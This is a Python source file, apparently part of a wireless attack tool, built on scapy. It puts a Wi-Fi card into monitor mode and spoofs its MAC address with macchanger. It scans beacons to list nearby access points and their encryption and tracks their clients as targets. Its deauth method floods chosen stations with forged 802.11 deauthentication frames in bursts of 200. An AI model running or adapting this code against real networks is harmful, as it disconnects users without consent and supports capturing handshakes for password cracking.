import struct
import subprocess
import threading
from time import sleep

from scapy.layers.dot11 import Dot11, Dot11Elt, sendp, Dot11Deauth, RadioTap
from termcolor import cprint

from .core import Station, AP


class Interface:
    def __init__(self, name, essid=None, monitor_mode=False, channel=None):
        self.name = name
        self.monitor_mode = monitor_mode
        if monitor_mode:
            self.set_monitor_mode()
        self.stations = []
        self.aps = []
        self.lock = threading.Lock()
        self.channel_lock = threading.Lock()
        self.ap_sema = threading.Semaphore(0)
        self.sta_sema = threading.Semaphore(0)
        self.essid = essid
        self.bssid = None
        self._channel = channel
        self.hop = True
        if channel:
            self.set_channel(channel)
            self.hop = False

    def set_up(self):
        subprocess.run(['/bin/ip', 'link', 'set', self.name, 'up'])

    def set_down(self):
        subprocess.run(['/bin/ip', 'link', 'set', self.name, 'down'])

    def set_monitor_mode(self):
        self.set_down()
        subprocess.run(['/sbin/iw', 'dev', self.name, 'set', 'monitor', 'none'])
        self.set_up()
        self.monitor_mode = True

    def set_managed_mode(self):
        self.set_down()
        subprocess.run(['/sbin/iw', 'dev', self.name, 'set', 'type', 'managed'])
        self.set_up()
        self.monitor_mode = False

    def get_frequency(self):
        return struct.pack("<h", 2407 + (self._channel * 5))

    @property
    def channel(self):
        return self._channel

    @channel.setter
    def channel(self, value):
        self.set_channel(value)

    def set_channel(self, channel):
        # in USA reg domain
        if 1 <= channel <= 11:
            subprocess.run(['/sbin/iw', 'dev', self.name, 'set', 'channel', str(channel)])
        self._channel = channel

    def set_mac(self, mac):
        self.set_down()
        subprocess.run(['/bin/ip', 'link', 'set', 'dev', self.name, 'address', mac], stdout=subprocess.DEVNULL)
        self.set_up()

    def reset_mac(self):
        self.set_down()
        subprocess.run(['/usr/bin/macchanger', '-p', self.name], stdout=subprocess.DEVNULL)
        self.set_up()

    def spoof_mac(self):
        self.set_down()
        subprocess.run(['/usr/bin/macchanger', '-A', self.name], stdout=subprocess.DEVNULL)
        self.set_up()


class MonitorInterface(Interface):
    def __init__(self, name, channel=None):
        super().__init__(name, monitor_mode=True, channel=channel)

    def deauth(self, target_mac, bssid, count=1, channel=None):
        self.channel_lock.acquire()
        if channel:
            self.set_channel(channel)
        pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        for i in range(count):
            cprint("DEAUTH!!!", 'red')
            for j in range(200):
                self.inject(pkt)
            sleep(1)
        self.channel_lock.release()

    def get_new_client(self):
        self.sta_sema.acquire()
        target = next((client for client in self.stations if client.new), None)
        target.new = False
        return target

    def inject(self, pkt):
        sendp(pkt, iface=self.name, verbose=False)

    def scan(self, pkt):
        client_mgmt_subtypes = (0, 2, 4)
        try:
            if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
                if pkt.addr3 not in [target.bssid for target in self.aps]:
                    self.lock.acquire()
                    self.ap_sema.release()
                    # http://stackoverflow.com/a/21664038
                    essid, channel, w = None, None, None
                    bssid = pkt.addr3
                    crypto = ""
                    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
                    p = pkt[Dot11Elt]
                    while isinstance(p, Dot11Elt):
                        if p.ID == 0:
                            try:
                                essid = p.info.decode()
                            except UnicodeDecodeError as e:
                                print(p.info)
                                essid = p.info
                        elif p.ID == 3:
                            try:
                                channel = ord(p.info)
                            except TypeError as e:
                                print(p.info)
                                channel = p.info
                        elif p.ID == 48:
                            crypto = "WPA2"
                            w = p.info[18:19]
                        elif p.ID == 221 and p.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                            crypto = "WPA"
                        p = p.payload
                    if not crypto:
                        if 'privacy' in cap:
                            crypto = "WEP"
                        else:
                            crypto = "OPN"
                    self.aps.append(AP(bssid, essid, crypto, channel, w))
                    # print("Adding", bssid, essid, crypto, channel, self.targets[-1].w)
                    self.lock.release()
            elif (pkt.haslayer(Dot11)
                  and (pkt.type == 0 and pkt.addr3 == self.bssid
                       and pkt.subtype in client_mgmt_subtypes
                       or (pkt.type == 2 and pkt.addr1 == self.bssid))):
                if pkt.addr2 not in [client.mac_addr for client in self.stations]:
                    self.lock.acquire()
                    try:
                        channel = pkt[Dot11Elt:3].info
                    except IndexError:
                        channel = self.channel
                    self.stations.append(Station(pkt.addr2, channel, pkt.addr3))
                    self.sta_sema.release()
                    self.lock.release()
        except Exception as e:
            print(pkt)
            raise e

    def get_new_target(self):
        self.ap_sema.acquire()
        target = next((ap for ap in self.aps if ap.new), None)
        target.new = False
        return target
